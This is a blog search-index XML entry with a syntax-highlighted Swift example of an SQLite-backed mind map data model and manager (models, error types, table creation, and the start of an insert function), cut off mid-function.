<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>思维导图数据结构</title>
    <link href="/2025/11/13/mindmapdata/"/>
    <url>/2025/11/13/mindmapdata/</url>
    
    <content type="html"><![CDATA[<p>一个简单的思维导图数据结构例子</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br></pre></td><td class="code"><pre><code class="hljs swift"><br><span class="hljs-comment">// SQLiteMindMapFull.swift</span><br><span class="hljs-comment">// Swift 6 async/await + Combine + Hierarchical Drag &amp; Drop</span><br><span class="hljs-comment">// Single-file SQLite-backed mind map module for iOS/macOS (Swift 6)</span><br><br><span class="hljs-keyword">import</span> Foundation<br><span class="hljs-keyword">import</span> Combine<br><span class="hljs-keyword">import</span> SQLite3<br><span class="hljs-keyword">import</span> UniformTypeIdentifiers<br><span class="hljs-keyword">import</span> SwiftUI<br><br><span class="hljs-comment">// MARK: - Models</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">MindMapNode</span>: <span class="hljs-title class_ inherited__">Identifiable</span>, <span class="hljs-title class_ inherited__">Codable</span>, <span class="hljs-title class_ inherited__">Sendable</span>, <span class="hljs-title class_ inherited__">Equatable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> id: <span class="hljs-type">String</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> parentId: <span class="hljs-type">String</span>?<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> title: <span class="hljs-type">String</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> content: <span class="hljs-type">String</span>?<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> position: <span class="hljs-type">Int</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> color: <span class="hljs-type">String</span>?<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> createdAt: <span class="hljs-type">Date</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> updatedAt: <span class="hljs-type">Date</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">init</span>(<span class="hljs-params">id</span>: <span class="hljs-type">String</span> <span class="hljs-operator">=</span> <span class="hljs-type">UUID</span>().uuidString,<br>                <span class="hljs-params">parentId</span>: <span class="hljs-type">String</span>? <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>,<br>                <span class="hljs-params">title</span>: <span class="hljs-type">String</span>,<br>                <span class="hljs-params">content</span>: <span class="hljs-type">String</span>? <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>,<br>                <span class="hljs-params">position</span>: <span class="hljs-type">Int</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>                <span class="hljs-params">color</span>: <span class="hljs-type">String</span>? <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>,<br>                <span class="hljs-params">createdAt</span>: <span class="hljs-type">Date</span> <span class="hljs-operator">=</span> <span class="hljs-type">Date</span>(),<br>                <span class="hljs-params">updatedAt</span>: <span class="hljs-type">Date</span> <span class="hljs-operator">=</span> <span class="hljs-type">Date</span>()) &#123;<br>        <span class="hljs-keyword">self</span>.id <span class="hljs-operator">=</span> id<br>        <span class="hljs-keyword">self</span>.parentId <span class="hljs-operator">=</span> parentId<br>        <span class="hljs-keyword">self</span>.title <span class="hljs-operator">=</span> title<br>        <span class="hljs-keyword">self</span>.content <span class="hljs-operator">=</span> content<br>        <span class="hljs-keyword">self</span>.position <span class="hljs-operator">=</span> position<br>        <span class="hljs-keyword">self</span>.color <span class="hljs-operator">=</span> color<br>        <span class="hljs-keyword">self</span>.createdAt <span class="hljs-operator">=</span> createdAt<br>        <span class="hljs-keyword">self</span>.updatedAt <span class="hljs-operator">=</span> updatedAt<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">MindMapTree</span>: <span class="hljs-title class_ inherited__">Identifiable</span>, <span class="hljs-title class_ inherited__">Codable</span>, <span class="hljs-title class_ inherited__">Equatable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> id: <span class="hljs-type">String</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> node: <span class="hljs-type">MindMapNode</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> children: [<span class="hljs-type">MindMapTree</span>]<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">init</span>(<span class="hljs-params">id</span>: <span class="hljs-type">String</span>, <span class="hljs-params">node</span>: <span class="hljs-type">MindMapNode</span>, <span class="hljs-params">children</span>: [<span class="hljs-type">MindMapTree</span>] <span class="hljs-operator">=</span> []) &#123;<br>        <span class="hljs-keyword">self</span>.id <span class="hljs-operator">=</span> id<br>        <span class="hljs-keyword">self</span>.node <span class="hljs-operator">=</span> node<br>        <span class="hljs-keyword">self</span>.children <span class="hljs-operator">=</span> children<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// MARK: - Errors</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">DatabaseError</span>: <span class="hljs-title class_ inherited__">Error</span>, <span class="hljs-title class_ inherited__">CustomStringConvertible</span> &#123;<br>    <span class="hljs-keyword">case</span> openFailed(message: <span class="hljs-type">String</span>?)<br>    <span class="hljs-keyword">case</span> prepareFailed(message: <span class="hljs-type">String</span>?)<br>    <span class="hljs-keyword">case</span> insertFailed(message: <span class="hljs-type">String</span>?)<br>    <span class="hljs-keyword">case</span> deleteFailed(message: <span class="hljs-type">String</span>?)<br>    <span class="hljs-keyword">case</span> queryFailed(message: <span class="hljs-type">String</span>?)<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> description: <span class="hljs-type">String</span> &#123;<br>        <span class="hljs-keyword">switch</span> <span class="hljs-keyword">self</span> &#123;<br>        <span class="hljs-keyword">case</span> .openFailed(<span class="hljs-keyword">let</span> msg): <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Open failed: <span class="hljs-subst">\(msg <span class="hljs-operator">??</span> <span class="hljs-string">&quot;&quot;</span>)</span>&quot;</span><br>        <span class="hljs-keyword">case</span> .prepareFailed(<span class="hljs-keyword">let</span> msg): <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Prepare failed: <span class="hljs-subst">\(msg <span class="hljs-operator">??</span> <span class="hljs-string">&quot;&quot;</span>)</span>&quot;</span><br>        <span class="hljs-keyword">case</span> .insertFailed(<span class="hljs-keyword">let</span> msg): <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Insert failed: <span class="hljs-subst">\(msg <span class="hljs-operator">??</span> <span class="hljs-string">&quot;&quot;</span>)</span>&quot;</span><br>        <span class="hljs-keyword">case</span> .deleteFailed(<span class="hljs-keyword">let</span> msg): <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Delete failed: <span class="hljs-subst">\(msg <span class="hljs-operator">??</span> <span class="hljs-string">&quot;&quot;</span>)</span>&quot;</span><br>        <span class="hljs-keyword">case</span> .queryFailed(<span class="hljs-keyword">let</span> msg): <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Query failed: <span class="hljs-subst">\(msg <span class="hljs-operator">??</span> <span class="hljs-string">&quot;&quot;</span>)</span>&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> <span class="hljs-type">SQLITE_TRANSIENT</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">unsafeBitCast</span>(<span class="hljs-operator">-</span><span class="hljs-number">1</span>, to: sqlite3_destructor_type.<span class="hljs-keyword">self</span>)<br><br><br><span class="hljs-comment">// MARK: - SQLiteMindMap Manager</span><br><span class="hljs-meta">@MainActor</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SQLiteMindMap</span>: <span class="hljs-title class_ inherited__">ObservableObject</span>  &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">let</span> shared <span class="hljs-operator">=</span> <span class="hljs-type">SQLiteMindMap</span>()<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> db: <span class="hljs-type">OpaquePointer</span>?<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> dbQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">&quot;sqlite.mindmap.queue&quot;</span>, qos: .userInitiated)<br><br>    <span class="hljs-comment">// Published flat list and tree</span><br>    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">private(set)</span> <span class="hljs-keyword">var</span> flatNodes: [<span class="hljs-type">MindMapNode</span>] <span class="hljs-operator">=</span> []<br>    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">private(set)</span> <span class="hljs-keyword">var</span> tree: [<span class="hljs-type">MindMapTree</span>] <span class="hljs-operator">=</span> []<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> cancellables <span class="hljs-operator">=</span> <span class="hljs-type">Set</span>&lt;<span class="hljs-type">AnyCancellable</span>&gt;()<br><br>    <span class="hljs-comment">// MARK: - Init</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">init</span>() &#123;<br>        <span class="hljs-type">Task</span> &#123;<br>            <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> openDatabase()<br>            <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> createTables()<br>            <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> refreshAllNodes()<br>            setupTreePublisher()<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">deinit</span> &#123;<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> db <span class="hljs-operator">=</span> db &#123;<br>            sqlite3_close(db)<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// MARK: - DB Setup</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">databaseURL</span>() <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">URL</span> &#123;<br>        <span class="hljs-keyword">try</span> <span class="hljs-type">FileManager</span>.default.url(for: .documentDirectory, in: .userDomainMask, appropriateFor: <span class="hljs-literal">nil</span>, create: <span class="hljs-literal">true</span>)<br>            .appendingPathComponent(<span class="hljs-string">&quot;mindmap.sqlite&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">openDatabase</span>() <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> &#123;<br>        <span class="hljs-keyword">let</span> url <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> databaseURL()<br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> withCheckedThrowingContinuation &#123; (cont: <span class="hljs-type">CheckedContinuation</span>&lt;<span class="hljs-type">Void</span>, <span class="hljs-type">Error</span>&gt;) <span class="hljs-keyword">in</span><br>            dbQueue.async &#123;<br>                <span class="hljs-keyword">var</span> localDb: <span class="hljs-type">OpaquePointer</span>?<br>                <span class="hljs-keyword">if</span> sqlite3_open(url.path, <span class="hljs-operator">&amp;</span>localDb) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_OK</span> &#123;<br>                    <span class="hljs-keyword">self</span>.db <span class="hljs-operator">=</span> localDb<br>                    <span class="hljs-comment">// enable foreign keys</span><br>                    sqlite3_exec(<span class="hljs-keyword">self</span>.db, <span class="hljs-string">&quot;PRAGMA foreign_keys = ON&quot;</span>, <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>)<br>                    cont.resume()<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">let</span> msg <span class="hljs-operator">=</span> localDb.flatMap &#123; <span class="hljs-type">String</span>(cString: sqlite3_errmsg(<span class="hljs-variable">$0</span>)) &#125;<br>                    cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.openFailed(message: msg))<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">createTables</span>() <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> &#123;<br>        <span class="hljs-keyword">let</span> sql <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        BEGIN;</span><br><span class="hljs-string">        CREATE TABLE IF NOT EXISTS mindmap_nodes (</span><br><span class="hljs-string">            id TEXT PRIMARY KEY,</span><br><span class="hljs-string">            parent_id TEXT REFERENCES mindmap_nodes(id) ON DELETE CASCADE,</span><br><span class="hljs-string">            title TEXT NOT NULL,</span><br><span class="hljs-string">            content TEXT,</span><br><span class="hljs-string">            position INTEGER DEFAULT 0,</span><br><span class="hljs-string">            color TEXT,</span><br><span class="hljs-string">            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,</span><br><span class="hljs-string">            updated_at DATETIME DEFAULT CURRENT_TIMESTAMP</span><br><span class="hljs-string">        );</span><br><span class="hljs-string">        CREATE INDEX IF NOT EXISTS idx_parent ON mindmap_nodes(parent_id);</span><br><span class="hljs-string">        COMMIT;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> executeSQL(sql)<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">executeSQL</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">sql</span>: <span class="hljs-type">String</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> &#123;<br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> withCheckedThrowingContinuation &#123; (cont: <span class="hljs-type">CheckedContinuation</span>&lt;<span class="hljs-type">Void</span>, <span class="hljs-type">Error</span>&gt;) <span class="hljs-keyword">in</span><br>            dbQueue.async &#123;<br>                <span class="hljs-keyword">var</span> err: <span class="hljs-type">UnsafeMutablePointer</span>&lt;<span class="hljs-type">Int8</span>&gt;?<br>                <span class="hljs-keyword">if</span> sqlite3_exec(<span class="hljs-keyword">self</span>.db, sql, <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, <span class="hljs-operator">&amp;</span>err) <span class="hljs-operator">==</span> <span class="hljs-type">SQLITE_OK</span> &#123;<br>                    cont.resume()<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">let</span> msg <span class="hljs-operator">=</span> err.map &#123; <span class="hljs-type">String</span>(cString: <span class="hljs-variable">$0</span>) &#125;<br>                    sqlite3_free(err)<br>                    cont.resume(throwing: <span class="hljs-type">DatabaseError</span>.queryFailed(message: msg))<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// MARK: - CRUD (async)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">insertNode</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">node</span>: <span class="hljs-type">MindMapNode</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> &#123;<br>        <span class="hljs-keyword">let</span> sql <span class="hljs-operator">=</span> <span class="hljs-string">&quot;INSERT INTO mindmap_nodes (id, parent_id, title, content, position, color, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, datetime(&#x27;now&#x27;), datetime(&#x27;now&#x27;));&quot;</span><br>        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> withCheckedThrowingContinuation &#123; (cont: <span class="hljs-type">CheckedContinuation</span>&lt;<span 